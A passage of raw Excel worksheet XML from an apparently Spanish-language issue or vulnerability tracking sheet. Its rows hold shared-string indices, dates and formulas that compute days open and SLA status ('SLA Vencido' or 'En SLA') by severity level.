        <v>3501</v>
      </c>
      <c r="H599" t="s">
        <v>3551</v>
      </c>
      <c r="J599" t="s">
        <v>1490</v>
      </c>
      <c r="L599" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M599" t="s">
        <v>522</v>
      </c>
      <c r="Q599" t="s">
        <v>3589</v>
      </c>
      <c r="T599" s="1">
        <v>46100</v>
      </c>
      <c r="U599" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>109</v>
      </c>
      <c r="V599" s="1">
        <f t="shared" si="31"/>
        <v>46130</v>
      </c>
      <c r="W599" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB599" t="s">
        <v>1975</v>
      </c>
      <c r="AD599" t="s">
        <v>1976</v>
      </c>
      <c r="AE599" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG599" t="s">
        <v>149</v>
      </c>
      <c r="AH599" t="str">
        <f>IFERROR(VLOOKUP(H599,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="600" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A600" s="84">
        <v>599</v>
      </c>
      <c r="B600" t="s">
        <v>32</v>
      </c>
      <c r="C600" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D600" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G600" t="s">
        <v>3501</v>
      </c>
      <c r="H600" t="s">
        <v>3552</v>
      </c>
      <c r="J600" t="s">
        <v>1490</v>
      </c>
      <c r="L600" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M600" t="s">
        <v>522</v>
      </c>
      <c r="Q600" t="s">
        <v>3581</v>
      </c>
      <c r="T600" s="1">
        <v>46100</v>
      </c>
      <c r="U600" s="76">
        <f t="shared" ref="U600:U621" ca="1" si="33">TODAY()-T600</f>
        <v>109</v>
      </c>
      <c r="V600" s="1">
        <f t="shared" si="31"/>
        <v>46130</v>
      </c>
      <c r="W600" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB600" t="s">
        <v>1975</v>
      </c>
      <c r="AD600" t="s">
        <v>1976</v>
      </c>
      <c r="AE600" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG600" t="s">
        <v>149</v>
      </c>
      <c r="AH600" t="str">
        <f>IFERROR(VLOOKUP(H600,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="601" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A601" s="84">
        <v>600</v>
      </c>
      <c r="B601" t="s">
        <v>32</v>
      </c>
      <c r="C601" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D601" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G601" t="s">
        <v>3501</v>
      </c>
      <c r="H601" t="s">
        <v>3549</v>
      </c>
      <c r="J601" t="s">
        <v>1490</v>
      </c>
      <c r="L601" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M601" t="s">
        <v>522</v>
      </c>
      <c r="Q601" t="s">
        <v>3583</v>
      </c>
      <c r="T601" s="1">
        <v>46100</v>
      </c>
      <c r="U601" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>109</v>
      </c>
      <c r="V601" s="1">
        <f t="shared" si="31"/>
        <v>46130</v>
      </c>
      <c r="W601" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB601" t="s">
        <v>1975</v>
      </c>
      <c r="AD601" t="s">
        <v>1976</v>
      </c>
      <c r="AE601" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG601" t="s">
        <v>149</v>
      </c>
      <c r="AH601" t="str">
        <f>IFERROR(VLOOKUP(H601,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="602" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A602" s="84">
        <v>601</v>
      </c>
      <c r="B602" t="s">
        <v>32</v>
      </c>
      <c r="C602" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D602" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G602" t="s">
        <v>1323</v>
      </c>
      <c r="H602" t="s">
        <v>3558</v>
      </c>
      <c r="J602" t="s">
        <v>3473</v>
      </c>
      <c r="L602" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M602" t="s">
        <v>522</v>
      </c>
      <c r="Q602" t="s">
        <v>1391</v>
      </c>
      <c r="T602" s="1">
        <v>46115</v>
      </c>
      <c r="U602" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>94</v>
      </c>
      <c r="V602" s="1">
        <f t="shared" ref="V602:V615" si="34">IF(M602="Critical",T602+10,IF(M602="High",T602+30,IF(M602="Bad",T602+30,IF(M602="Medium",T602+90,IF(M602="Warm",T602+90,IF(M602="Low",T602+120,IF(M602="Fair",T602+120,IF(M602="Neutral",T602+120,""))))))))</f>
        <v>46145</v>
      </c>
      <c r="W602" s="76" t="str">
        <f t="shared" ref="W602:W615" ca="1" si="35">IF(M602="Critical",IF(U602&gt;10,"SLA Vencido","En SLA"),IF(M602="High",IF(U602&gt;30,"SLA Vencido","En SLA"),IF(M602="Bad",IF(U602&gt;30,"SLA Vencido","En SLA"),IF(M602="Medium",IF(U602&gt;90,"SLA Vencido","En SLA"),IF(M602="Warm",IF(U602&gt;90,"SLA Vencido","En SLA"),IF(M602="Low",IF(U602&gt;120,"SLA Vencido","En SLA"),IF(M602="Fair",IF(U602&gt;120,"SLA Vencido","En SLA"),IF(M602="Neutral",IF(U602&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB602" t="s">
        <v>3478</v>
      </c>
      <c r="AD602" t="s">
        <v>3479</v>
      </c>
      <c r="AE602" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG602" t="s">
        <v>149</v>
      </c>
      <c r="AH602" t="str">
        <f>IFERROR(VLOOKUP(H602,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="603" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A603" s="84">
        <v>602</v>
      </c>
      <c r="B603" t="s">
        <v>32</v>
      </c>
      <c r="C603" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D603" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G603" t="s">
        <v>3519</v>
      </c>
      <c r="H603" t="s">
        <v>3547</v>
      </c>
      <c r="J603" t="s">
        <v>1490</v>
      </c>
      <c r="L603" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M603" t="s">
        <v>522</v>
      </c>
      <c r="Q603" t="s">
        <v>3590</v>
      </c>
      <c r="T603" s="1">
        <v>46132</v>
      </c>
      <c r="U603" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>77</v>
      </c>
      <c r="V603" s="1">
        <f t="shared" si="34"/>
        <v>46162</v>
      </c>
      <c r="W603" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB603" t="s">
        <v>1975</v>
      </c>
      <c r="AD603" t="s">
        <v>1976</v>
      </c>
      <c r="AE603" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG603" t="s">
        <v>149</v>
      </c>
      <c r="AH603" t="str">
        <f>IFERROR(VLOOKUP(H603,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="604" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A604" s="84">
        <v>603</v>
      </c>
      <c r="B604" t="s">
        <v>32</v>
      </c>
      <c r="C604" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D604" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G604" t="s">
        <v>1323</v>
      </c>
      <c r="H604" t="s">
        <v>3556</v>
      </c>
      <c r="J604" t="s">
        <v>1844</v>
      </c>
      <c r="L604" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M604" t="s">
        <v>522</v>
      </c>
      <c r="Q604" t="s">
        <v>1391</v>
      </c>
      <c r="T604" s="1">
        <v>46115</v>
      </c>
      <c r="U604" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>94</v>
      </c>
      <c r="V604" s="1">
        <f t="shared" si="34"/>
        <v>46145</v>
      </c>
      <c r="W604" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB604" t="s">
        <v>3477</v>
      </c>
      <c r="AD604" t="s">
        <v>3479</v>
      </c>
      <c r="AE604" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG604" t="s">
        <v>149</v>
      </c>
      <c r="AH604" t="str">
        <f>IFERROR(VLOOKUP(H604,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="605" spans="1:34" ht="261" hidden="1" x14ac:dyDescent="0.35">
      <c r="A605" s="84">
        <v>604</v>
      </c>
      <c r="B605" t="s">
        <v>32</v>
      </c>
      <c r="C605" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D605" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G605" t="s">
        <v>3625</v>
      </c>
      <c r="I605" t="s">
        <v>3626</v>
      </c>
      <c r="J605" t="s">
        <v>1186</v>
      </c>
      <c r="L605" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M605" t="s">
        <v>111</v>
      </c>
      <c r="Q605" t="s">
        <v>3628</v>
      </c>
      <c r="T605" s="1">
        <v>46113</v>
      </c>
      <c r="U605" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>96</v>
      </c>
      <c r="V605" s="1">
        <f t="shared" si="34"/>
        <v>46233</v>
      </c>
      <c r="W605" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB605" s="65" t="s">
        <v>3629</v>
      </c>
      <c r="AC605" s="65" t="s">
        <v>3103</v>
      </c>
      <c r="AD605" s="65" t="s">
        <v>3630</v>
      </c>
      <c r="AE605" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH605" t="str">
        <f>IFERROR(VLOOKUP(H605,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="606" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A606" s="84">
        <v>605</v>
      </c>
      <c r="B606" t="s">
        <v>32</v>
      </c>
      <c r="C606" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D606" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G606" t="s">
        <v>3625</v>
      </c>
      <c r="I606" t="s">
        <v>3627</v>
      </c>
      <c r="J606" t="s">
        <v>1192</v>
      </c>
      <c r="L606" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M606" t="s">
        <v>111</v>
      </c>
      <c r="Q606" t="s">
        <v>3628</v>
      </c>
      <c r="T606" s="1">
        <v>46113</v>
      </c>
      <c r="U606" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>96</v>
      </c>
      <c r="V606" s="1">
        <f t="shared" si="34"/>
        <v>46233</v>
      </c>
      <c r="W606" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB606" s="65" t="s">
        <v>3631</v>
      </c>
      <c r="AC606" s="65" t="s">
        <v>3632</v>
      </c>
      <c r="AD606" s="65" t="s">
        <v>3108</v>
      </c>
      <c r="AE606" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH606" t="str">
        <f>IFERROR(VLOOKUP(H606,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="607" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A607" s="84">
        <v>606</v>
      </c>
      <c r="B607" t="s">
        <v>32</v>
      </c>
      <c r="C607" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D607" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G607" t="s">
        <v>1203</v>
      </c>
      <c r="I607" t="s">
        <v>3633</v>
      </c>
      <c r="J607" t="s">
        <v>3123</v>
      </c>
      <c r="L607" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M607" t="s">
        <v>111</v>
      </c>
      <c r="Q607" t="s">
        <v>3634</v>
      </c>
      <c r="T607" s="1">
        <v>46113</v>
      </c>
      <c r="U607" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>96</v>
      </c>
      <c r="V607" s="1">
        <f t="shared" si="34"/>
        <v>46233</v>
      </c>
      <c r="W607" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB607" s="65" t="s">
        <v>3635</v>
      </c>
      <c r="AC607" s="65" t="s">
        <v>3637</v>
      </c>
      <c r="AD607" s="65" t="s">
        <v>3636</v>
      </c>
      <c r="AE607" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG607" s="65" t="s">
        <v>3638</v>
      </c>
      <c r="AH607" t="str">
        <f>IFERROR(VLOOKUP(H607,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="608" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A608" s="84">
        <v>607</v>
      </c>
      <c r="B608" t="s">
        <v>32</v>
      </c>
      <c r="C608" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D608" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G608" t="s">
        <v>1816</v>
      </c>
      <c r="I608" t="s">
        <v>3639</v>
      </c>
      <c r="J608" t="s">
        <v>3641</v>
      </c>
      <c r="L608" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M608" t="s">
        <v>522</v>
      </c>
      <c r="Q608" s="87" t="s">
        <v>3643</v>
      </c>
      <c r="T608" s="1">
        <v>46129</v>
      </c>
      <c r="U608" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>80</v>
      </c>
      <c r="V608" s="1">
        <f t="shared" si="34"/>
        <v>46159</v>
      </c>
      <c r="W608" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB608" s="65" t="s">
        <v>3646</v>
      </c>
      <c r="AC608" s="65" t="s">
        <v>3648</v>
      </c>
      <c r="AD608" s="65" t="s">
        <v>3647</v>
      </c>
      <c r="AE608" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG608" s="65" t="s">
        <v>3239</v>
      </c>
      <c r="AH608" t="str">
        <f>IFERROR(VLOOKUP(H608,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="609" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A609" s="84">
        <v>608</v>
      </c>
      <c r="B609" t="s">
        <v>32</v>
      </c>
      <c r="C609" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D609" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G609" t="s">
        <v>1816</v>
      </c>
      <c r="I609" t="s">
        <v>3640</v>
      </c>
      <c r="J609" t="s">
        <v>3642</v>
      </c>
      <c r="L609" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M609" t="s">
        <v>42</v>
      </c>
      <c r="Q609" t="s">
        <v>3644</v>
      </c>
      <c r="T609" s="1">
        <v>46129</v>
      </c>
      <c r="U609" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>80</v>
      </c>
      <c r="V609" s="1">
        <f t="shared" si="34"/>
        <v>46139</v>
      </c>
      <c r="W609" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB609" s="65" t="s">
        <v>3645</v>
      </c>
      <c r="AC609" s="65" t="s">
        <v>3650</v>
      </c>
      <c r="AD609" s="65" t="s">
        <v>3649</v>
      </c>
      <c r="AE609" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG609" s="65" t="s">
        <v>3239</v>
      </c>
      <c r="AH609" t="str">
        <f>IFERROR(VLOOKUP(H609,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="610" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A610" s="84">
        <v>609</v>
      </c>
      <c r="B610" t="s">
        <v>32</v>
      </c>
      <c r="C610" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D610" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G610" t="s">
        <v>1302</v>
      </c>
      <c r="I610" t="s">
        <v>3652</v>
      </c>
      <c r="J610" t="s">
        <v>3653</v>
      </c>
      <c r="L610" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M610" t="s">
        <v>522</v>
      </c>
      <c r="Q610" t="s">
        <v>3654</v>
      </c>
      <c r="T610" s="1">
        <v>46132</v>
      </c>
      <c r="U610" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>77</v>
      </c>
      <c r="V610" s="1">
        <f t="shared" si="34"/>
        <v>46162</v>
      </c>
      <c r="W610" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB610" s="65" t="s">
        <v>3655</v>
      </c>
      <c r="AC610" s="65" t="s">
        <v>3657</v>
      </c>
      <c r="AD610" s="65" t="s">
        <v>3656</v>
      </c>
      <c r="AE610" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG610" t="s">
        <v>149</v>
      </c>
      <c r="AH610" t="str">
        <f>IFERROR(VLOOKUP(H610,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="611" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A611" s="84">
        <v>610</v>
      </c>
      <c r="B611" t="s">
        <v>32</v>
      </c>
      <c r="C611" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D611" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G611" t="s">
        <v>3454</v>
      </c>
      <c r="H611" t="s">
        <v>3658</v>
      </c>
      <c r="J611" t="s">
        <v>574</v>
      </c>
      <c r="L611" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M611" s="63" t="s">
        <v>61</v>
      </c>
      <c r="Q611" t="s">
        <v>3661</v>
      </c>
      <c r="T611" s="1">
        <v>46132</v>
      </c>
      <c r="U611" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>77</v>
      </c>
      <c r="V611" s="1">
        <f t="shared" si="34"/>
        <v>46222</v>
      </c>
      <c r="W611" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB611" t="s">
        <v>1893</v>
      </c>
      <c r="AC611" t="s">
        <v>1790</v>
      </c>
      <c r="AE611" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG611" t="s">
        <v>149</v>
      </c>
      <c r="AH611" t="str">
        <f>IFERROR(VLOOKUP(H611,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="612" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A612" s="84">
        <v>611</v>
      </c>
      <c r="B612" t="s">
        <v>32</v>
      </c>
      <c r="C612" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D612" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G612" t="s">
        <v>3660</v>
      </c>
      <c r="H612" t="s">
        <v>3659</v>
      </c>
      <c r="J612" t="s">
        <v>574</v>
      </c>
      <c r="L612" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M612" s="63" t="s">
        <v>61</v>
      </c>
      <c r="Q612" t="s">
        <v>3662</v>
      </c>
      <c r="T612" s="1">
        <v>46132</v>
      </c>
      <c r="U612" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>77</v>
      </c>
      <c r="V612" s="1">
        <f t="shared" si="34"/>
        <v>46222</v>
      </c>
      <c r="W612" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB612" t="s">
        <v>1893</v>
      </c>
      <c r="AC612" t="s">
        <v>1790</v>
      </c>
      <c r="AE612" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG612" t="s">
        <v>149</v>
      </c>
      <c r="AH612" t="str">
        <f>IFERROR(VLOOKUP(H612,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="613" spans="1:34" s="88" customFormat="1" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A613" s="84">
        <v>612</v>
      </c>
      <c r="B613" s="88" t="s">
        <v>32</v>
      </c>
      <c r="C613" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D613" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G613" s="88" t="s">
        <v>3678</v>
      </c>
      <c r="H613" s="88" t="s">
        <v>3677</v>
      </c>
      <c r="I613" s="88" t="s">
        <v>3676</v>
      </c>
      <c r="J613" s="74" t="s">
        <v>870</v>
      </c>
      <c r="L613" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M613" s="88" t="s">
        <v>61</v>
      </c>
      <c r="N613" s="88">
        <v>4.2</v>
      </c>
      <c r="Q613" s="88" t="s">
        <v>3679</v>
      </c>
      <c r="T613" s="89">
        <v>46134</v>
      </c>
      <c r="U613" s="56">
        <f t="shared" ca="1" si="33"/>
        <v>75</v>
      </c>
      <c r="V613" s="89">
        <f t="shared" si="34"/>
        <v>46224</v>
      </c>
      <c r="W613" s="56" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB613" s="90" t="s">
        <v>3680</v>
      </c>
      <c r="AC613" s="90" t="s">
        <v>3681</v>
      </c>
      <c r="AD613" s="90" t="s">
        <v>3053</v>
      </c>
      <c r="AE613" s="90" t="s">
        <v>1987</v>
      </c>
      <c r="AG613" s="88" t="s">
        <v>149</v>
      </c>
      <c r="AH613" s="88" t="str">
        <f>IFERROR(VLOOKUP(H613,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="614" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A614" s="84">
        <v>613</v>
      </c>
      <c r="B614" t="s">
        <v>32</v>
      </c>
      <c r="C614" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D614" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G614" t="s">
        <v>1539</v>
      </c>
      <c r="H614" t="s">
        <v>3682</v>
      </c>
      <c r="I614" t="s">
        <v>3683</v>
      </c>
      <c r="J614" t="s">
        <v>3684</v>
      </c>
      <c r="L614" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M614" t="s">
        <v>61</v>
      </c>
      <c r="N614">
        <v>5.3</v>
      </c>
      <c r="Q614" t="s">
        <v>3234</v>
      </c>
      <c r="T614" s="1">
        <v>46135</v>
      </c>
      <c r="U614" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>74</v>
      </c>
      <c r="V614" s="1">
        <f t="shared" si="34"/>
        <v>46225</v>
      </c>
      <c r="W614" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB614" s="65" t="s">
        <v>3685</v>
      </c>
      <c r="AC614" s="65" t="s">
        <v>1972</v>
      </c>
      <c r="AD614" s="65" t="s">
        <v>1959</v>
      </c>
      <c r="AE614" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG614" s="65" t="s">
        <v>747</v>
      </c>
      <c r="AH614" s="88" t="str">
        <f>IFERROR(VLOOKUP(H614,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="615" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A615" s="84">
        <v>614</v>
      </c>
      <c r="B615" t="s">
        <v>32</v>
      </c>
      <c r="C615" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D615" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G615" t="s">
        <v>1302</v>
      </c>
      <c r="I615" t="s">
        <v>3690</v>
      </c>
      <c r="J615" s="65" t="s">
        <v>3694</v>
      </c>
      <c r="L615" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M615" t="s">
        <v>61</v>
      </c>
      <c r="N615" t="s">
        <v>1580</v>
      </c>
      <c r="Q615" t="s">
        <v>3698</v>
      </c>
      <c r="T615" s="1">
        <v>46139</v>
      </c>
      <c r="U615" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>70</v>
      </c>
      <c r="V615" s="1">
        <f t="shared" si="34"/>
        <v>46229</v>
      </c>
      <c r="W615" s="76" t="str">
        <f t="shared" ca="1" si="35"/>
        <v>En SLA</v>
      </c>
      <c r="AB615" s="65" t="s">
        <v>3699</v>
      </c>
      <c r="AC615" s="65" t="s">
        <v>3701</v>
      </c>
      <c r="AD615" s="65" t="s">
        <v>3700</v>
      </c>
      <c r="AE615" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG615" s="65" t="s">
        <v>149</v>
      </c>
      <c r="AH615">
        <v>11</v>
      </c>
    </row>
    <row r="616" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A616" s="84">
        <v>615</v>
      </c>
      <c r="B616" t="s">
        <v>32</v>
      </c>
      <c r="C616" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D616" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G616" t="s">
        <v>1302</v>
      </c>
      <c r="I616" t="s">
        <v>3691</v>
      </c>
      <c r="J616" t="s">
        <v>3695</v>
      </c>
      <c r="L616" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M616" t="s">
        <v>61</v>
      </c>
      <c r="Q616" t="s">
        <v>3698</v>
      </c>
      <c r="T616" s="1">
        <v>46139</v>
      </c>
      <c r="U616" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>70</v>
      </c>
      <c r="V616" s="1">
        <f t="shared" ref="V616:V621" si="36">IF(M615="Critical",T616+10,IF(M615="High",T616+30,IF(M615="Bad",T616+30,IF(M615="Medium",T616+90,IF(M615="Warm",T616+90,IF(M615="Low",T616+120,IF(M615="Fair",T616+120,IF(M615="Neutral",T616+120,""))))))))</f>
        <v>46229</v>
      </c>
      <c r="W616" s="76" t="str">
        <f t="shared" ref="W616:W621" ca="1" si="37">IF(M615="Critical",IF(U616&gt;10,"SLA Vencido","En SLA"),IF(M615="High",IF(U616&gt;30,"SLA Vencido","En SLA"),IF(M615="Bad",IF(U616&gt;30,"SLA Vencido","En SLA"),IF(M615="Medium",IF(U616&gt;90,"SLA Vencido","En SLA"),IF(M615="Warm",IF(U616&gt;90,"SLA Vencido","En SLA"),IF(M615="Low",IF(U616&gt;120,"SLA Vencido","En SLA"),IF(M615="Fair",IF(U616&gt;120,"SLA Vencido","En SLA"),IF(M615="Neutral",IF(U616&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB616" s="65" t="s">
        <v>3702</v>
      </c>
      <c r="AC616" s="65" t="s">
        <v>3704</v>
      </c>
      <c r="AD616" s="65" t="s">
        <v>3703</v>
      </c>
      <c r="AE616" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG616" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="617" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A617" s="84">
        <v>616</v>
      </c>
      <c r="B617" t="s">
        <v>32</v>
      </c>
      <c r="C617" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D617" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G617" t="s">
        <v>1302</v>
      </c>
      <c r="I617" t="s">
        <v>3692</v>
      </c>
      <c r="J617" t="s">
        <v>3696</v>
      </c>
      <c r="L617" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M617" t="s">
        <v>111</v>
      </c>
      <c r="Q617" t="s">
        <v>3698</v>
      </c>
      <c r="T617" s="1">
        <v>46139</v>
      </c>
      <c r="U617" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>70</v>
      </c>
      <c r="V617" s="1">
        <f t="shared" si="36"/>
        <v>46229</v>
      </c>
      <c r="W617" s="76" t="str">
        <f t="shared" ca="1" si="37"/>
        <v>En SLA</v>
      </c>
      <c r="AB617" s="65" t="s">
        <v>3705</v>
      </c>
      <c r="AC617" s="65" t="s">
        <v>3707</v>
      </c>
      <c r="AD617" s="65" t="s">
        <v>3706</v>
      </c>
      <c r="AE617" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG617" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="618" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A618" s="84">
        <v>617</v>
      </c>
      <c r="B618" t="s">
        <v>32</v>
      </c>
      <c r="C618" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D618" s="84" t="s">
        <v>3651</v>
      </c>
      <c r="G618" t="s">
        <v>1302</v>
      </c>
      <c r="I618" t="s">
        <v>3693</v>
      </c>
      <c r="J618" t="s">
        <v>3697</v>
      </c>
      <c r="L618" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M618" t="s">
        <v>111</v>
      </c>
      <c r="Q618" t="s">
        <v>3698</v>
      </c>
      <c r="T618" s="1">
        <v>46139</v>
      </c>
      <c r="U618" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>70</v>
      </c>
      <c r="V618" s="1">
        <f t="shared" si="36"/>
        <v>46259</v>
      </c>
      <c r="W618" s="76" t="str">
        <f t="shared" ca="1" si="37"/>
        <v>En SLA</v>
      </c>
      <c r="AB618" s="65" t="s">
        <v>3708</v>
      </c>
      <c r="AC618" s="65" t="s">
        <v>3710</v>
      </c>
      <c r="AD618" s="65" t="s">
        <v>3709</v>
      </c>
